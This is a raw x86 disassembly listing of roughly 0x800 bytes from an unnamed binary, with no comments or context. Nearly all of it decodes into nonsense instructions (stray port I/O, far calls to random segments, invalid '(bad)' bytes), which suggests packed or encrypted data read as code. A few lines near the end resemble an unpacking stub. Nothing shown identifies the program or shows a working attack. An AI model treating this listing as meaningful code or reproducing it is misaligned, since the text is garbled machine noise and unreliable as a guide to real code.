  402855:	xor    eax,0x5ac1ab1c
  40285a:	xor    eax,0x42bc53e8
  40285f:	cli    
  402860:	jmp    DWORD PTR ds:0x9a65bca4
  402866:	in     al,dx
  402867:	xlat   BYTE PTR ds:[ebx]
  402868:	add    dh,bh
  40286a:	xor    al,0xab
  40286c:	pop    esp
  40286d:	call   0x18c1:0x84298de0
  402874:	mov    edx,0xd93a7e89
  402879:	stos   BYTE PTR es:[edi],al
  40287a:	dec    edx
  40287b:	sub    ch,ch
  40287d:	sub    DWORD PTR [eax-0x4a0d44a3],ebp
  402883:	cmp    DWORD PTR [eax],ecx
  402885:	pop    es
  402886:	sub    DWORD PTR [ebx],ebp
  402888:	imul   edi,DWORD PTR [eax],0xffffff9f
  40288b:	fstp   TBYTE PTR [edx+0x50]
  40288e:	xlat   BYTE PTR ds:[ebx]
  40288f:	cdq    
  402890:	repnz adc al,0x4f
  402893:	pop    di
  402895:	push   eax
  402896:	inc    BYTE PTR [edx+0x43]
  402899:	push   0xffffffc2
  40289b:	out    0x53,al
  40289d:	pop    eax
  40289e:	xchg   esi,eax
  40289f:	pop    ebp
  4028a0:	fidiv  WORD PTR [edi]
  4028a2:	bound  ecx,QWORD PTR [edi+0x6ba28fe1]
  4028a8:	inc    esi
  4028a9:	pushf  
  4028aa:	adc    al,0xd2
  4028ac:	xor    dl,BYTE PTR [edi]
  4028ae:	out    0x83,eax
  4028b0:	xchg   ebp,eax
  4028b1:	mov    eax,0xd9fa46d5
  4028b6:	out    0x78,al
  4028b8:	leave  
  4028b9:	mov    ch,0xea
  4028bb:	pop    ecx
  4028bc:	mov    bl,0xdb
  4028be:	mov    ebp,0xb9c6de8f
  4028c3:	mov    esp,0x999d432b
  4028c8:	je     0x4028e7
  4028ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028cb:	cmp    BYTE PTR [edi],dl
  4028cd:	and    eax,0x47c00f
  4028d2:	mov    ds:0x738869ec,eax
  4028d7:	sub    bh,dh
  4028d9:	sbb    ah,dl
  4028db:	or     al,0xcd
  4028dd:	or     edx,DWORD PTR [edi]
  4028df:	xor    dh,bh
  4028e1:	xchg   ebp,eax
  4028e2:	and    DWORD PTR [esi],ecx
  4028e4:	enter  0x577a,0x7a
  4028e8:	and    DWORD PTR [ebp+eiz*4-0x5044154d],eax
  4028ef:	dec    ecx
  4028f0:	jnp    0x4028bc
  4028f2:	xor    dh,BYTE PTR [eax-0x4855056c]
  4028f8:	sbb    al,0x25
  4028fa:	inc    ecx
  4028fb:	sbb    DWORD PTR [eax],ebp
  4028fd:	jp     0x402905
  4028ff:	and    edi,ebp
  402901:	and    eax,ecx
  402903:	fcmove st,st(6)
  402905:	mov    eax,0xa0c0182c
  40290a:	add    eax,edi
  40290c:	push   eax
  40290d:	ins    BYTE PTR es:[edi],dx
  40290e:	call   0x5553f1f2
  402913:	mov    fs,eax
  402915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402916:	mov    ss,WORD PTR [esi-0x52]
  402919:	xlat   BYTE PTR ds:[ebx]
  40291a:	stos   DWORD PTR es:[edi],eax
  40291b:	(bad)  
  40291c:	hlt    
  40291d:	fwait
  40291e:	retf   0xd555
  402921:	rcl    DWORD PTR [eax+0x3502294d],0x53
  402928:	push   eax
  402929:	xchg   DWORD PTR [esi+ebp*4-0x6bcaed05],ebx
  402930:	pop    esi
  402931:	mov    cl,0xb
  402933:	ds stos DWORD PTR es:[edi],eax
  402935:	mov    ch,0xb0
  402937:	xor    DWORD PTR [ecx],0x8ae2f257
  40293d:	pop    ecx
  40293e:	das    
  40293f:	imul   ecx,DWORD PTR [eax],0x6f
  402942:	ins    BYTE PTR es:[edi],dx
  402943:	pop    ebx
  402944:	xchg   ecx,eax
  402945:	mov    edx,0x33077a25
  40294a:	push   0x3a
  40294c:	pop    esp
  40294d:	mov    al,ds:0xba579290
  402952:	ins    DWORD PTR es:[edi],dx
  402953:	mov    ebp,0x2fb2bfcb
  402958:	xor    edi,0xfffffffd
  40295b:	xorps  xmm5,XMMWORD PTR [ebx]
  40295e:	arpl   WORD PTR [ecx],di
  402960:	out    0x17,eax
  402962:	repnz inc esp
  402964:	xor    ecx,ecx
  402966:	out    0x1c,eax
  402968:	ret    
  402969:	das    
  40296a:	mov    bh,0xcf
  40296c:	adc    bh,al
  40296e:	xchg   edi,eax
  40296f:	aaa    
  402970:	push   0xffffff91
  402972:	pop    ebp
  402973:	push   0x35
  402975:	mov    ebx,0x3b2b7361
  40297a:	or     eax,0x23219000
  40297f:	es mov al,0x76
  402982:	dec    esi
  402983:	loopne 0x402983
  402985:	dec    esi
  402986:	mov    dh,0x4b
  402988:	sub    esi,0x2675aade
  40298e:	and    esp,DWORD PTR [edx]
  402990:	es jecxz 0x40294c
  402993:	and    BYTE PTR [ebx+0x4c],ah
  402996:	sbb    al,0xd1
  402998:	outs   dx,DWORD PTR ds:[esi]
  402999:	(bad)  
  40299a:	jo     0x40295b
  40299c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40299d:	fwait
  40299e:	and    al,0x94
  4029a0:	icebp  
  4029a1:	pop    ds
  4029a2:	sub    al,0xa0
  4029a4:	sahf   
  4029a5:	repz out 0xa2,al
  4029a8:	in     eax,dx
  4029a9:	in     eax,dx
  4029aa:	popf   
  4029ab:	in     eax,0x52
  4029ad:	xchg   ecx,eax
  4029ae:	sbb    ecx,eax
  4029b0:	push   es
  4029b1:	jg     0x4029ea
  4029b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b4:	ins    BYTE PTR es:[edi],dx
  4029b5:	ins    DWORD PTR es:[edi],dx
  4029b6:	pop    eax
  4029b7:	fldlg2 
  4029b9:	xlat   BYTE PTR ds:[ebx]
  4029ba:	and    edi,DWORD PTR [ecx-0x5bf77c8c]
  4029c0:	inc    eax
  4029c1:	mov    eax,0xa4879c80
  4029c6:	stos   BYTE PTR es:[edi],al
  4029c7:	repz test BYTE PTR [eax-0x3c34b85a],dl
  4029ce:	mov    eax,0x2890cef9
  4029d3:	ss in  al,0x2
  4029d6:	dec    edx
  4029d7:	call   0x545f:0x1684f512
  4029de:	cmp    eax,0x25599ccb
  4029e3:	jle    0x4029e1
  4029e5:	int3   
  4029e6:	(bad)  
  4029e8:	loopne 0x4029f0
  4029ea:	arpl   WORD PTR [ebx-0x3457b6a0],si
  4029f0:	sub    edi,DWORD PTR [esi]
  4029f2:	xor    al,0x5c
  4029f4:	mov    ecx,DWORD PTR [eax+esi*8-0x22068f60]
  4029fb:	mov    eax,0xa6a40ef1
  402a00:	dec    esi
  402a01:	call   0xa912:0xa58d1a9f
  402a08:	lahf   
  402a09:	loopne 0x402a4d
  402a0b:	sbb    cl,BYTE PTR [edx-0x79]
  402a0e:	or     ecx,edx
  402a10:	mov    bl,0x7e
  402a12:	out    0xb5,al
  402a14:	mul    ecx
  402a16:	cli    
  402a17:	sbb    ecx,edi
  402a19:	fild   WORD PTR [ebx-0x13]
  402a1c:	inc    edx
  402a1d:	xchg   ah,bl
  402a1f:	mov    edx,0x239c2e03
  402a24:	sahf   
  402a25:	sti    
  402a26:	mov    ebx,0xe5f66946
  402a2b:	std    
  402a2c:	fnstenv [eax]
  402a2e:	sub    eax,0xbf088aab
  402a33:	mov    esi,fs
  402a35:	fucomp st(7)
  402a37:	retf   0xa4f3
  402a3a:	imul   ecx,ebx,0x336839b5
  402a40:	into   
  402a41:	js     0x402a1f
  402a43:	push   esi
  402a44:	push   esp
  402a45:	not    bh
  402a47:	inc    edx
  402a48:	aas    
  402a49:	inc    edx
  402a4a:	mov    gs:0x97c715bb,eax
  402a50:	cmp    cl,BYTE PTR [ebx+0x5a81f949]
  402a56:	cmp    eax,0x1e8bf8ad
  402a5b:	xor    DWORD PTR [edi],edi
  402a5d:	lds    ecx,FWORD PTR ds:0x77aaff7b
  402a63:	pop    ecx
  402a64:	sub    BYTE PTR [edx],0x0
  402a67:	inc    ebp
  402a68:	test   DWORD PTR [ebx],0xa741cbca
  402a6e:	cmp    BYTE PTR [edi+0x27ef6a4f],al
  402a74:	sub    eax,DWORD PTR [ebp-0x3a]
  402a77:	sub    al,0x17
  402a79:	aaa    
  402a7a:	cmp    dl,0xa2
  402a7d:	pusha  
  402a7e:	sub    eax,0xf3fe2649
  402a83:	sbb    eax,0x1c620f56
  402a88:	jle    0x402a47
  402a8a:	in     al,dx
  402a8b:	pop    es
  402a8c:	inc    edx
  402a8d:	pop    esp
  402a8e:	sub    edi,ebp
  402a90:	cwde   
  402a91:	cmc    
  402a92:	ror    ebp,0x30
  402a95:	add    BYTE PTR [ebp-0x3e7cd219],0xb5
  402a9c:	add    esi,esp
  402a9e:	jecxz  0x402a78
  402aa0:	or     edx,eax
  402aa2:	mov    dl,0x72
  402aa4:	push   edi
  402aa5:	push   ebx
  402aa6:	ror    dh,cl
  402aa8:	imul   edi,DWORD PTR [eax-0x7e39cc25],0x42a3110d
  402ab2:	add    BYTE PTR ds:0xe90042a3,ch
  402ab8:	push   es
  402ab9:	add    eax,0xd2cc0000
  402abe:	cmp    eax,0xd9db3dc4
  402ac3:	fidivr DWORD PTR [esi]
  402ac5:	icebp  
  402ac6:	out    0xdb,al
  402ac8:	xchg   esp,eax
  402ac9:	mov    esp,0x10a24ec4
  402ace:	js     0x402b48
  402ad0:	push   0x7c
  402ad2:	js     0x402b4c
  402ad4:	adc    DWORD PTR [ecx-0x6a82dd40],esp
  402ada:	mov    dl,0x41
  402adc:	adc    DWORD PTR [edi],0xfffffff9
  402adf:	and    dl,dl
  402ae1:	(bad)  
  402ae2:	fist   DWORD PTR [esi-0x10]
  402ae5:	je     0x402ae2
  402ae7:	cmp    BYTE PTR [ebx+0x3d],bl
  402aea:	jecxz  0x402afe
  402aec:	push   0xa64362d
  402af1:	cmp    BYTE PTR ds:0xef777577,bh
  402af7:	call   0x8822ca3c
  402afc:	fs mov edx,0xb7bc3196
  402b02:	mov    eax,ds:0x9735ef7b
  402b07:	outs   dx,DWORD PTR ds:[esi]
  402b08:	ins    DWORD PTR es:[edi],dx
  402b09:	sbb    esi,DWORD PTR [edx-0x3b]
  402b0c:	out    dx,eax
  402b0d:	inc    ebx
  402b0e:	iret   
  402b0f:	cld    
  402b10:	retf   0x6415
  402b13:	and    al,0x52
  402b15:	or     al,0xb5
  402b17:	call   0x493b:0xd145b05
  402b1e:	dec    edi
  402b1f:	ins    BYTE PTR es:[edi],dx
  402b20:	ret    0xa7
  402b23:	sbb    eax,0x22a42234
  402b28:	inc    ebx
  402b29:	fisttp DWORD PTR [ecx+0x6f9faedf]
  402b2f:	and    eax,ebp
  402b31:	aad    0x5d
  402b33:	call   0x5a51:0x6dd61747
  402b3a:	test   BYTE PTR [ebx-0x58],ah
  402b3d:	fld    QWORD PTR [edx*4+0x35903fac]
  402b44:	sbb    BYTE PTR [edi+edi*2-0x3599ec7b],dl
  402b4b:	pop    ecx
  402b4c:	call   0xf08e:0x1bc7d868
  402b53:	mov    cl,0x69
  402b55:	or     edi,DWORD PTR [ecx-0x8b50db0]
  402b5b:	cmp    eax,0x9fb4c429
  402b60:	not    BYTE PTR [edi-0x5949292c]
  402b66:	lods   al,BYTE PTR ds:[esi]
  402b67:	jmp    0x9dc8802d
  402b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b6d:	call   0x4c9a791f
  402b72:	lods   eax,DWORD PTR ds:[esi]
  402b73:	adc    eax,0xb844d855
  402b78:	je     0x402b20
  402b7a:	xchg   esi,eax
  402b7b:	or     edi,DWORD PTR [ebp+0xc3294c8]
  402b81:	adc    edi,0xffffff89
  402b84:	(bad)  
  402b85:	add    BYTE PTR [esi+edi*2],dh
  402b88:	(bad)  
  402b89:	xchg   ebx,eax
  402b8a:	rcl    esi,0xe3
  402b8d:	ror    DWORD PTR ds:[edx+0x5c126001],cl
  402b94:	push   0x7a60580d
  402b99:	or     DWORD PTR [esi],0xffffff86
  402b9c:	ja     0x402b5d
  402b9e:	inc    edi
  402b9f:	sahf   
  402ba0:	icebp  
  402ba1:	xchg   edi,eax
  402ba2:	rol    BYTE PTR [edi-0x74],0x7f
  402ba6:	mov    bh,al
  402ba8:	jmp    0x8fc0:0x445c9a72
  402baf:	lods   eax,DWORD PTR ds:[esi]
  402bb0:	call   DWORD PTR [edx]
  402bb2:	sbb    ecx,0xffffffaf
  402bb5:	dec    ecx
  402bb6:	cmp    eax,0xa988bb7a
  402bbb:	out    dx,eax
  402bbc:	fidiv  DWORD PTR ds:0x774b0ea0
  402bc2:	push   eax
  402bc3:	aas    
  402bc4:	ret    
  402bc5:	dec    ebp
  402bc6:	lds    ecx,FWORD PTR [esi-0x2d]
  402bc9:	pop    esi
  402bca:	jne    0x402bd3
  402bcc:	mov    ecx,0xba13c506
  402bd1:	push   ebp
  402bd2:	sbb    BYTE PTR [esi-0x5c],bl
  402bd5:	cmp    eax,0xf865aeb1
  402bda:	dec    edi
  402bdb:	fwait
  402bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bdd:	jno    0x402bc5
  402bdf:	scas   al,BYTE PTR es:[edi]
  402be0:	sub    dl,BYTE PTR [eax+0x5c]
  402be3:	add    DWORD PTR [esi-0x56],ebx
  402be6:	jl     0x402ba2
  402be8:	mov    fs:0x44325556,eax
  402bee:	dec    edx
  402bef:	sub    DWORD PTR [esi],ebx
  402bf1:	clc    
  402bf2:	dec    edx
  402bf3:	fst    st(7)
  402bf5:	inc    edx
  402bf6:	and    dl,BYTE PTR [esi-0x74]
  402bf9:	rcl    BYTE PTR [eax+0x5ef297b9],cl
  402bff:	loopne 0x402c43
  402c01:	sahf   
  402c02:	stc    
  402c03:	pop    ss
  402c04:	dec    ebx
  402c05:	jo     0x402c07
  402c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c08:	nop
  402c09:	mov    ch,0xdd
  402c0b:	enter  0x2655,0x56
  402c0f:	shr    bh,0xb9
  402c12:	mov    eax,ds:0xe0208c8a
  402c17:	push   ss
  402c18:	mov    eax,0x5e3ef02b
  402c1d:	add    DWORD PTR [edx],0x7d210f1c
  402c23:	pop    esp
  402c24:	or     edx,esi
  402c26:	in     al,dx
  402c27:	lds    esp,FWORD PTR [edi+ecx*2+0x68]
  402c2b:	scas   al,BYTE PTR es:[edi]
  402c2c:	mov    bh,0x20
  402c2e:	shrd   DWORD PTR [eax-0x59],edx,cl
  402c32:	or     BYTE PTR [ecx],0x7d
  402c35:	xchg   esp,eax
  402c36:	in     eax,dx
  402c37:	cwde   
  402c38:	push   ss
  402c39:	stos   DWORD PTR es:[edi],eax
  402c3a:	pop    edi
  402c3b:	xchg   ebp,eax
  402c3c:	fwait
  402c3d:	push   0xb0dd44ef
  402c42:	aam    0xf6
  402c44:	popf   
  402c45:	add    eax,0x6ba72c86
  402c4a:	fstp   QWORD PTR [edx+0x2df1ee81]
  402c50:	xor    eax,0x377897b1
  402c55:	add    al,0xa
  402c57:	xchg   ecx,eax
  402c58:	aam    0x6a
  402c5a:	pop    ss
  402c5b:	mov    ch,0xc5
  402c5d:	xchg   esp,eax
  402c5e:	fs ins BYTE PTR es:[edi],dx
  402c60:	inc    edi
  402c61:	or     al,0x59
  402c63:	sub    al,ch
  402c65:	xor    bl,BYTE PTR ds:0xb5d66e0f
  402c6b:	xor    BYTE PTR [eax-0xd4244f4],ah
  402c71:	(bad)  
  402c72:	iret   
  402c73:	imul   esi,edi,0xffffffad
  402c76:	sbb    al,0xfe
  402c78:	pop    ebp
  402c79:	icebp  
  402c7a:	iret   
  402c7b:	mov    BYTE PTR [esi],0xc8
  402c7e:	iret   
  402c7f:	fist   DWORD PTR [edx+esi*1]
  402c82:	push   DWORD PTR [edi-0x80]
  402c85:	fs inc edi
  402c87:	fistp  QWORD PTR [ebp+0x71]
  402c8a:	adc    DWORD PTR [eax-0xb2ee9f3],edx
  402c90:	xlat   BYTE PTR ds:[ebx]
  402c91:	push   edi
  402c92:	add    si,WORD PTR [ebp-0x8]
  402c96:	iret   
  402c97:	adc    eax,0x59680485
  402c9c:	cmc    
  402c9d:	repz pop ebx
  402c9f:	adc    BYTE PTR [edi+esi*4],bh
  402ca2:	rcl    edx,1
  402ca4:	loop   0x402cc6
  402ca6:	jp     0x402cc4
  402ca8:	jnp    0x402cd9
  402caa:	jne    0x402cd4
  402cac:	pop    es
  402cad:	ret    
  402cae:	push   ebx
  402caf:	and    al,BYTE PTR [edx+0x17]
  402cb2:	dec    ecx
  402cb3:	shr    DWORD PTR [ebx+0x0],1
  402cb6:	aaa    
  402cb7:	jmp    0xe433db3a
  402cbc:	out    0x50,al
  402cbe:	mov    cl,0xfe
  402cc0:	sbb    esp,edi
  402cc2:	jno    0x402d01
  402cc4:	rcl    BYTE PTR [edi-0x7e],0x9e
  402cc8:	outs   dx,BYTE PTR ds:[esi]
  402cc9:	mov    ecx,0xe95dcb18
  402cce:	loopne 0x402d38
  402cd0:	add    al,0x4b
  402cd2:	pushf  
  402cd3:	push   ds
  402cd4:	lahf   
  402cd5:	leave  
  402cd6:	mov    eax,ds:0xa16191e3
  402cdb:	cmp    BYTE PTR [esi-0x29],0x89
  402cdf:	mov    esp,0xee68f77
  402ce4:	sub    eax,0x18e6cdbf
  402ce9:	addr16 add eax,0x34bfd31
  402cef:	or     dl,BYTE PTR [ebx+0x47f02e9d]
  402cf5:	add    BYTE PTR [eax+0x4e160091],ch
  402cfb:	jmp    0x402cda
  402cfd:	movhps QWORD PTR [ebp-0x4a],xmm3
  402d01:	pop    es
  402d02:	xor    edx,ebx
  402d04:	mov    dh,0xbd
  402d06:	call   0x5e43:0x2a2608e6
  402d0d:	cmp    eax,0x875f04c0
  402d12:	out    dx,al
  402d13:	and    DWORD PTR [ecx-0x61],edi
  402d16:	and    al,0xfe
  402d18:	sub    eax,0x3a39c363
  402d1d:	lock scas eax,DWORD PTR es:[edi]
  402d1f:	lods   al,BYTE PTR ds:[esi]
  402d20:	mov    WORD PTR [edx+0x7e],cs
  402d23:	daa    
  402d24:	es sahf 
  402d26:	and    al,0x2e
  402d29:	xor    al,0x79
  402d2b:	fisttp WORD PTR [esi+0x73]
  402d2e:	dec    eax
  402d2f:	clc    
  402d30:	jecxz  0x402d54
  402d32:	jl     0x402cbc
  402d34:	xor    eax,0x13a2715f
  402d39:	mov    esi,0x3ac51c32
  402d3e:	repnz or al,0x42
  402d41:	aad    0x26
  402d43:	or     al,bh
  402d45:	adc    DWORD PTR [ebx+0x66160572],esp
  402d4b:	dec    ecx
  402d4c:	(bad)  
  402d4d:	add    eax,0x4000d110
  402d52:	mov    esp,0x834c0624
  402d57:	pop    ss
  402d58:	pop    esp
  402d59:	sub    bl,BYTE PTR [edx]
  402d5b:	mov    al,0xc
  402d5d:	lods   al,BYTE PTR ds:[esi]
  402d5e:	dec    esp
  402d5f:	pushf  
  402d60:	mov    edi,0xb4048f7c
  402d65:	push   ds
  402d66:	cmovge esi,DWORD PTR [esi+ebx*1]
  402d6a:	jmp    0x402da6
  402d6c:	addr16 addr16 cmp al,0x71
  402d70:	jns    0x402d17
  402d72:	or     BYTE PTR [eax+0x48],bl
  402d75:	xor    DWORD PTR [esi-0x2b160d0d],edx
  402d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d7c:	sbb    dh,BYTE PTR [esi-0x1366e28b]
  402d82:	sbb    BYTE PTR [esi-0x618d5b9c],bl
  402d88:	stc    
  402d89:	arpl   WORD PTR [ebp+0x16f003c3],si
  402d8f:	sub    BYTE PTR [ecx+0x45],cl
  402d92:	mov    esi,0x5a779f17
  402d97:	sub    al,0x58
  402d99:	inc    ebp
  402d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9b:	sbb    DWORD PTR [eax-0xa74607a],ecx
  402da1:	dec    edi
  402da2:	outs   dx,BYTE PTR ds:[esi]
  402da3:	mov    DWORD PTR [edi-0x20],edx
  402da6:	in     eax,0x8b
  402da8:	scas   eax,DWORD PTR es:[edi]
  402da9:	sub    al,0x8a
  402dab:	mov    edx,0xde95e91e
  402db0:	mov    dl,0x23
  402db2:	adc    edx,DWORD PTR [edx+0x51]
  402db5:	int    0x9b
  402db7:	loope  0x402e1c
  402db9:	mov    BYTE PTR [esp+esi*4+0x59],bl
  402dbd:	adc    eax,0xeec26c4
  402dc2:	fidivr WORD PTR [ecx]
  402dc4:	inc    ebp
  402dc5:	test   BYTE PTR [ebx+0x69],bl
  402dc8:	mov    ch,0x5
  402dca:	fsub   DWORD PTR [edi-0x9935808]
  402dd0:	enter  0xc26,0xf3
  402dd4:	jne    0x402d6b
  402dd6:	sbb    edi,DWORD PTR [edx+edx*1]
  402dd9:	mov    esp,0x95a65ea8
  402dde:	sbb    eax,0xe2a9c983
  402de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402de4:	rcl    DWORD PTR [edi-0x5],0x1f
  402de8:	fsubr  st,st(0)
  402dea:	cmp    edx,DWORD PTR [eax+esi*1-0x3203295b]
  402df1:	out    0xa3,al
  402df3:	or     al,0xfd
  402df5:	sahf   
  402df6:	sbb    BYTE PTR [edi+edi*4+0x7f],al
  402dfa:	mov    bl,0xb1
  402dfc:	adc    DWORD PTR [ecx+edi*8-0x67],esp
  402e00:	retf   
  402e01:	cld    
  402e02:	(bad)  
  402e03:	mov    dh,0x7c
  402e05:	jns    0x402dc5
  402e07:	xor    bl,BYTE PTR [esi+0x24]
  402e0a:	fist   DWORD PTR [eax]
  402e0c:	test   DWORD PTR [edx-0x55],eax
  402e0f:	jae    0x402e86
  402e11:	sti    
  402e12:	les    edx,FWORD PTR ds:0x8557905f
  402e18:	fsub   st(6),st
  402e1a:	les    eax,FWORD PTR [edi+0x59]
  402e1d:	fidivr DWORD PTR [ecx]
  402e1f:	fstp   QWORD PTR [eax-0x37cb22b9]
  402e25:	mov    ebx,0xad90b04a
  402e2a:	adc    esp,DWORD PTR [edx]
  402e2c:	sbb    al,0x51
  402e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e2f:	sbb    edx,edx
  402e31:	jne    0x402dda
  402e33:	and    al,0x3c
  402e35:	fdiv   QWORD PTR [esi-0xcf37a21]
  402e3b:	and    BYTE PTR [eax+0x392664bd],dl
  402e41:	mov    ah,dh
  402e43:	icebp  
  402e44:	xor    eax,0xadf594d6
  402e49:	sbb    ebp,esi
  402e4b:	sub    DWORD PTR [eax-0x302ff10b],esi
  402e51:	rcr    BYTE PTR [esp+esi*1],1
  402e54:	jne    0x402ec8
  402e56:	loop   0x402eaf
  402e58:	je     0x402e67
  402e5a:	(bad)  
  402e5c:	xchg   DWORD PTR ds:0x56dc63c2,ebx
  402e62:	inc    ebx
  402e63:	jmp    ecx
  402e65:	gs and eax,0x9f36f407
  402e6b:	mov    esi,DWORD PTR ds:0xc6bb37b6
  402e71:	xchg   BYTE PTR [edx],ah
  402e73:	int    0xca
  402e75:	jg     0x402eee
  402e77:	inc    esi
  402e78:	mov    ds:0x69bf28d6,al
  402e7d:	push   ds
  402e7e:	imul   ebx,DWORD PTR [ecx],0xc4e897cc
  402e84:	in     al,dx
  402e85:	shl    BYTE PTR [ebx],0x96
  402e88:	retf   0x6e24
  402e8b:	hlt    
  402e8c:	inc    DWORD PTR [edx-0x402eeba0]
  402e92:	imul   BYTE PTR [ecx]
  402e94:	jbe    0x402ee1
  402e96:	test   DWORD PTR [ecx],esp
  402e98:	add    eax,0x34e43bc8
  402e9d:	leave  
  402e9e:	push   cs
  402e9f:	mov    ds:0x4d0530c6,al
  402ea4:	adc    esp,DWORD PTR [esp+edx*8+0x6fec8f9b]
  402eab:	pop    esp
  402eac:	pop    es
  402ead:	dec    edx
  402eae:	(bad)  [edx]
  402eb0:	xchg   esi,eax
  402eb1:	cmp    DWORD PTR [eax],0xffffffcd
  402eb4:	inc    esi
  402eb5:	or     eax,0x88b64d7f
  402eba:	repz sbb BYTE PTR [ecx+0x70],al
  402ebe:	mov    eax,edi
  402ec0:	push   ss
  402ec1:	and    DWORD PTR [eax],eax
  402ec3:	retf   
  402ec4:	cmp    DWORD PTR [edx-0x29df2dbb],0xffffffdc
  402ecb:	pop    ebx
  402ecc:	lods   eax,DWORD PTR ds:[esi]
  402ecd:	daa    
  402ece:	or     edx,DWORD PTR [ebx]
  402ed0:	(bad)  
  402ed1:	or     eax,0x933e4817
  402ed6:	xor    DWORD PTR ds:0x5a9c055,ebp
  402edc:	fsub   DWORD PTR [esp+eax*1+0x6e]
  402ee0:	add    esi,edx
  402ee2:	in     al,0x52
  402ee4:	xchg   DWORD PTR [ebp-0x19ef960d],esp
  402eea:	lds    esp,FWORD PTR [ecx+0x20831223]
  402ef0:	mov    esi,DWORD PTR ds:0x98a47d0e
  402ef6:	in     al,dx
  402ef7:	(bad)  
  402ef8:	cmp    BYTE PTR [edx-0x32],ch
  402efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402efc:	sbb    BYTE PTR [ebx+0x3],cl
  402eff:	mov    edi,0xc5c8bcb
  402f04:	jmp    0xf192:0x4f9298df
  402f0b:	jmp    0x402f79
  402f0d:	add    al,0x30
  402f0f:	sub    ah,dl
  402f11:	pop    eax
  402f12:	dec    edi
  402f14:	scas   eax,DWORD PTR es:[edi]
  402f15:	adc    esp,DWORD PTR [edi+0x59]
  402f18:	xchg   BYTE PTR [eax+0x60e8c8d],cl
  402f1e:	sub    DWORD PTR [ecx+0x51],ebx
  402f21:	xchg   edx,eax
  402f22:	adc    al,BYTE PTR [eax+0x62]
  402f25:	add    DWORD PTR [edx-0x19],0x809f551a
  402f2c:	jb     0x402f23
  402f2e:	popf   
  402f2f:	dec    edi
  402f30:	cli    
  402f31:	outs   dx,DWORD PTR ds:[esi]
  402f32:	xchg   ebx,eax
  402f33:	cmp    esi,esi
  402f35:	push   ds
  402f36:	xor    edx,0xca8f8859
  402f3c:	pop    ds
  402f3d:	rol    BYTE PTR [ebp+0x4a4bd1bd],1
  402f43:	xchg   ecx,eax
  402f44:	add    eax,0x63
  402f47:	push   edx
  402f48:	sbb    DWORD PTR [ebx-0x3954cb8e],edx
  402f4e:	lods   eax,DWORD PTR ds:[esi]
  402f4f:	jl     0x402f3e
  402f51:	loop   0x402f8f
  402f53:	icebp  
  402f54:	fs in  eax,0x93
  402f57:	ret    0x5fa9
  402f5a:	(bad)  
  402f5b:	mov    edi,0xd915a9cb
  402f60:	scas   al,BYTE PTR es:[edi]
  402f61:	adc    eax,0x9c1111ff
  402f66:	popf   
  402f67:	push   ecx
  402f68:	jmp    0x426f:0x1f0f7035
  402f6f:	pop    ebp
  402f70:	test   al,0x47
  402f72:	imul   edx,edi,0x6a72170c
  402f78:	jg     0x402fa2
  402f7a:	pushf  
  402f7b:	xchg   edx,eax
  402f7c:	scas   al,BYTE PTR es:[edi]
  402f7d:	(bad)  
  402f7e:	mov    al,0xa
  402f80:	push   cs
  402f81:	xor    eax,0x533a753f
  402f86:	mov    DWORD PTR [edx],esp
  402f88:	mov    ch,0x31
  402f8a:	cdq    
  402f8b:	cmp    dh,BYTE PTR [edx+0x53]
  402f8e:	mov    esi,0xb02de202
  402f93:	lods   al,BYTE PTR ds:[esi]
  402f94:	and    al,0x2d
  402f96:	xchg   ebx,eax
  402f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f98:	jmp    0xe270:0x11834b31
  402f9f:	ror    eax,1
  402fa1:	pop    ds
  402fa2:	paddusb mm2,QWORD PTR [ebx]
  402fa5:	aaa    
  402fa6:	jno    0x402fda
  402fa8:	cli    
  402fa9:	adc    eax,0x2f1331c1
  402fae:	and    al,0xd7
  402fb0:	push   ebp
  402fb1:	or     BYTE PTR [ebx],dh
  402fb3:	mov    ebx,0x7c456434
  402fb8:	adc    al,0x60
  402fba:	lahf   
  402fbb:	jne    0x402ffd
  402fbd:	cmp    BYTE PTR [eax+0x3a879ab],bh
  402fc3:	(bad)  
  402fc4:	xor    ecx,ecx
  402fc6:	add    ecx,DWORD PTR ds:0x42a401
  402fcc:	mov    ecx,DWORD PTR [ecx]
  402fce:	add    DWORD PTR ds:0x42a2b9,ecx
  402fd4:	jmp    0x4034df
  402fd9:	cmp    al,0xc8
  402fdb:	rcl    ecx,0xd1
  402fde:	ror    esp,1
  402fe0:	int    0xcb
  402fe2:	sub    bh,al
  402fe4:	stos   BYTE PTR es:[edi],al
  402fe5:	jp     0x402f8d
  402fe7:	add    edx,0xffffff8c
  402fea:	sbb    edi,DWORD PTR [eax+0x78]
  402fed:	push   0x7c
  402fef:	js     0x403069
  402ff1:	in     al,0xb3
  402ff3:	inc    esi
  402ff4:	not    DWORD PTR [ecx]
  402ff6:	ins    DWORD PTR es:[edi],dx
  402ff7:	or     DWORD PTR [edx-0x2d15ddb],0x130ca6ca
  403001:	loopne 0x402fea
  403003:	je     0x40307d
  403005:	in     al,dx
  403006:	mov    ds:0x3fb83f00,al
  40300b:	ins    BYTE PTR es:[edi],dx
  40300c:	lods   eax,DWORD PTR ds:[esi]
  40300d:	ins    DWORD PTR es:[edi],dx
  40300e:	cwde   
  40300f:	dec    esi
  403010:	jge    0x403047
  403012:	test   BYTE PTR [edx+0x2a021665],ch
  403018:	jne    0x40307e
  40301a:	jp     0x40303a
  40301c:	and    eax,0xe48b67cc
  403021:	fs jmp 0x40302c
  403024:	std    
  403025:	jne    0x402fbf
  403027:	shl    DWORD PTR [eax+0x7b71a4d4],0x3a
  40302e:	dec    esi
  40302f:	jae    0x403012
  403031:	mov    al,ds:0x6c09488a
  403036:	pop    edx
  403037:	aas    
  403038:	jle    0x40301a
  40303a:	add    ch,dh
  40303c:	pop    ecx
  40303d:	jl     0x403044
